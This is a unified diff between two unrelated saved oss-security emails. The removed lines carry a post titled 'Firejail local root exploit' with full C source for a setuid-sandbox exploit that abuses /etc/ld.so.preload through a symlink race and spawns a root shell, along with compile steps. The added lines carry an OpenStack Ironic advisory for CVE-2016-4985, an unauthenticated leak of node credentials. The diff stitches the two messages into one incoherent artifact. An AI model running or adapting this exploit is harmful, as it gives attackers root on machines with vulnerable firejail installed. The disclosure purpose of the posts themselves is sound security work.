@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3020" "Wednesday" "4" "January" "2017" "14:12:48" "+0100" "Sebastian Krahmer" "krahmer@suse.com" "<20170104131248.GA28596@suse.de>" "126" "[oss-security] Firejail local root exploit" "^Cc:" nil nil "1" "2017010413:12:48" "[oss-security] Firejail local root exploit" (number mark "        krahmer@suse Jan  4  126/3020  " thread-indent "\"[oss-security] Firejail local root exploit\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2810" "Tuesday" "21" "June" "2016" "18:25:17" "-0400" "Jim Rollenhagen" "jim@jimrollenhagen.com" "<20160621222517.GE21113@jimrollenhagen.com>" "87" "[oss-security] Ironic node information including credentials exposed to unathenticated users" nil nil nil "6" "2016062122:25:17" "[oss-security] Ironic node information including credentials exposed to unathenticated users" (number mark "U       jim@jimrolle Jun 21   87/2810  " thread-indent "\"[oss-security] Ironic node information including credentials exposed to unathenticated users\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 4026 invoked by uid 550); 4 Jan 2017 13:13:01 -0000
+Received: (qmail 23816 invoked by uid 550); 21 Jun 2016 22:50:58 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,146 +11,110 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 3958 invoked from network); 4 Jan 2017 13:13:00 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-Message-ID: <20170104131248.GA28596@suse.de>
-MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="n8g4imXOkfNTN/H1"
-Content-Disposition: inline
-Organization: SUSE Linux GmbH, GF: Felix =?utf-8?Q?Imend?=
- =?utf-8?Q?=F6rffer?= =?utf-8?Q?=2C?= Jane Smithard, Graham Norton, HRB 21284
- (AG Nuernberg)
-User-Agent: Outlook
-Cc: netblue30@yahoo.com
-Date: Wed, 4 Jan 2017 14:12:48 +0100
-From: Sebastian Krahmer <krahmer@suse.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Firejail local root exploit
+Received: (qmail 3803 invoked from network); 21 Jun 2016 22:25:31 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=jimrollenhagen.com;
+	s=default; t=1466547919;
+	bh=ZCFyf9qV5AUox8AfRKyRbgcDBIMxvY1VhDA2KuxRang=;
+	h=Date:From:To:Subject;
+	b=dUIQXKV2/m8nBou9Lu7+YPSouwATfwQ1j5OIa5xxCOYvfmeGjYcVzF35aUdQ19KJh
+	 rxyDIeP5ffTbfLqMhthwIwY7ppIZIxSO/sJbyU80y/HpQx3EcEPv+mACMJs69BNSrC
+	 0H8dGCPcmBF3lADMXaij7Cx3cG0x2Jb49h7siN5s=
+Date: Tue, 21 Jun 2016 18:25:17 -0400
+From: Jim Rollenhagen <jim@jimrollenhagen.com>
 To: oss-security@lists.openwall.com
+Message-ID: <20160621222517.GE21113@jimrollenhagen.com>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="zbGR4y+acU1DwHSi"
+Content-Disposition: inline
+Subject: [oss-security] Ironic node information including credentials exposed to
+ unathenticated users
 
---n8g4imXOkfNTN/H1
+--zbGR4y+acU1DwHSi
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
 
-Hi
+=============================================================================
+Ironic node information including credentials exposed to unathenticated users
+=============================================================================
 
-Please find attached PoC for firejail, which seems to be quite
-popular sandboxing tool.
-
-Sebastian
-
--- 
-
-~ perl self.pl
-~ $_='print"\$_=\47$_\47;eval"';eval
-~ krahmer@suse.com - SuSE Security Team
+:Date: June 21, 2016
+:CVE: CVE-2016-4985
 
 
---n8g4imXOkfNTN/H1
-Content-Type: text/x-c; charset=us-ascii
-Content-Disposition: attachment; filename="firenail.c"
-
-/* firejail local root exploit (host to host)
- *
- * (C) 2017 Sebastian Krahmer under the GPL.
- *
- * WARNING: This exploit uses ld.so.preload technique.
- * If you are in bad luck, you may end up with an unusable system.
- * SO BE WARNED. ONLY TEST IT IN YOUR SAFE VM's.
- *
- * Get the beauty that this is a shared lib and a running
- * executable at the same time, as we tamper with /etc/ld.so.preload
- *
- * Therefore you have to compile it like this:
- *
- * $ cc -fPIC -fpic -std=c11 -Wall -pedantic -c firenail.c
- * $ gcc -shared -pie firenail.o -o firenail
- * $ ./firenail
- *
- * DO NOT TELL ME THAT SELINUX WOULD HAVE PREVENTED THIS EXPLOIT.
- * IF I WAS ABOUT TO BYPASS SELINUX ALONG, I WOULD HAVE DONE THE
- * EXPLOIT DIFFERENTLY.
- *
- * Analysis: Sandboxing is cool, but it has to be done right.
- * Firejail has too broad attack surface that allows users
- * to specify a lot of options, where one of them eventually
- * broke by accessing user-files while running with euid 0.
- * There are some other similar races. Turns out that it can be
- * _very difficult_ to create a generic sandbox suid wrapper thats
- * secure but still flexible enough to sandbox arbitrary binaries.
- *
- * Tested with latest commit 699ab75654ad5ab7b48b067a2679c544cc8725f6.
- */
-#define _POSIX_C_SOURCE 200212
-#include <stdio.h>
-#include <unistd.h>
-#include <stdlib.h>
-#include <string.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/stat.h>
-#include <sys/types.h>
+Affects
+~~~~~~~
+- Ironic: >=2014.2, >=4.0.0 <=4.2.4, >=4.3.0 <=5.1.1
 
 
-const char *const ldso = "/etc/ld.so.preload";
+Description
+~~~~~~~~~~~
+Devananda van der Veen (IBM) reported the following vulnerability in Ironic.
 
-int main();
+A client with network access to the ironic-api service can bypass Keystone
+authentication and retrieve all information about any Node registered with
+Ironic, if they know (or are able to guess) the MAC address of a network card
+belonging to that Node, by sending a crafted POST request to the
+/v1/drivers/$DRIVER_NAME/vendor_passthru resource.
 
-__attribute__((constructor)) void init(void)
-{
-	if (geteuid())
-		return;
+The response will include the full Node details, including management
+passwords, even when /etc/ironic/policy.json is configured to hide passwords in
+API responses.
 
-	unlink(ldso);
-	char *sh[] = {"/bin/sh", "--noprofile", "--norc", NULL};
-	setuid(0);
-	setgid(0);
-	execve(*sh, sh, NULL);
-	exit(1);
-}
-
-
-void die(const char *s)
-{
-	perror(s);
-	exit(errno);
-}
+This vulnerability has been verified in all currently supported branches
+(liberty, mitaka, master) and traced back to code introduced in commit
+3e568fbbbcc5748035c1448a0bdb26306470797c during the Juno development cycle.
+Therefore, it is likely that both juno and kilo braches (and their releases)
+are also affected.
 
 
-int main()
-{
-	printf("[*] fire(j|n)ail local root exploit 2017\n\n");
-
-	char me[4096] = {0}, *home = getenv("HOME");
-	if (!home)
-		die("[-] no $HOME");
-	if (readlink("/proc/self/exe", me, sizeof(me) - 1) < 0)
-		die("[-] Unable to find myself");
-
-	char path[256] = {0};
-	snprintf(path, sizeof(path) - 1, "%s/.firenail", home);
-	if (mkdir(path, 0700) < 0 && errno != EEXIST)
-		die("[-] mkdir");
-
-	snprintf(path, sizeof(path) - 1, "%s/.firenail/.Xauthority", home);
-	if (symlink(ldso, path) < 0 && errno != EEXIST)
-		die("[-] symlink");
-
-	system("firejail --private=.firenail /usr/bin/id");
-
-	int fd = open(ldso, O_RDWR|O_TRUNC);
-	if (fd < 0)
-		die("[-] open");
-	write(fd, me, strlen(me));
-	write(fd, "\n", 1);
-	close(fd);
-
-	char *su[] = {"/bin/su", NULL};
-	execve(*su, su, NULL);
-	die("[-] execve su");
-
-	return -1;
-}
+Patches
+~~~~~~~
+https://review.openstack.org/332195 (Newton)
+https://review.openstack.org/332196 (Mitaka)
+https://review.openstack.org/332197 (Liberty)
 
 
---n8g4imXOkfNTN/H1--
+Credits
+~~~~~~~
+- Devananda van der Veen from IBM (CVE-2016-4985)
+
+References
+~~~~~~~~~~
+- https://bugs.launchpad.net/ironic/+bug/1572796
+- http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-4985
+
+Notes
+~~~~~
+- This fix is included in the upcoming 4.2.5 (Liberty), 5.1.2 (Mitaka), and
+  6.0.0 (Newton) releases of Ironic.
+
+
+--
+Jim Rollenhagen
+OpenStack Ironic Project Team Lead
+
+
+--zbGR4y+acU1DwHSi
+Content-Type: application/pgp-signature
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQIcBAEBCAAGBQJXab7NAAoJELZqL5FCxsCcjtEP/RTM4as/TNxtCpoNyMwzopXk
+1kC4se/yX5styvefWw0WEGTqX1W2ploT2bBvYSCMcvrUH63yVyMcZpUK1yz6QENB
+MaB1VBx4n2SGYeQ351qBDFMCfD0e4+0RWQIYWrs/fXHa7fSkxeH8LBMtPvEYxhNv
+4/ytu6eYZ0UUlKQwt8cNt6rxPGCOiPdB+l3lsANiK2VoeLThlgtNp7LMnvuHmNR4
+dmAHiPYQuEvsppqC+NDf0n+wGegyMAnmXSk+2GtwCItPiV3JZK9ic43KwjrhuBOH
+mp6/1kGJpkAxVPyG1AnMeDCMFEEzK7wGqezdSFqCOwrxCYB+FPiam3T3tAh5gbRx
+xwnkoYcNngtK8qf+78ns8RscGL6n9GsnlC7pOBFbOMffTvUHh3H7KZLqgi2E/YR7
+Jd8uoI4cwtAr2uJWmHPedgWoorTtO7jobQ4kFuwp+GUzSFwms+fpHP4d0BpWuGhD
+47RLLnL5pljHGWlxxDrxHe8qk+LMng8MYwys1xJb5bdWMRbtkDCXckh5aY4cAwGz
+Z/1g70/Yz+Au4oNWukRw/dKF4G6I3EupWWpmfTHCh/n1pp1ZeAfHViIN23xOIJQS
+hbvxGcJ6qImsuQ2STjFOnZy1qdio4lAmXGZ8qUfOB0N/Layen31MMg7YBi6dYZ1B
+N9IRPmyUq6mb0nG1ci7R
+=XZCW
+-----END PGP SIGNATURE-----
+
+--zbGR4y+acU1DwHSi--
